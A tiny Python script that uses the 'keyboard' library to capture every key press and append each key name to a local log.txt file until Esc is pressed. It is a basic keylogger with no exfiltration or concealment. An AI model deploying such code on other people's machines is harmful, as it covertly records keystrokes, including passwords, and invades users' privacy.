import keyboard

def salir():
    exit()

def press(tecla):
    with open("log.txt", "a") as log:
        log.write(tecla.name)

keyboard.on_press(press)
keyboard.wait('esc')
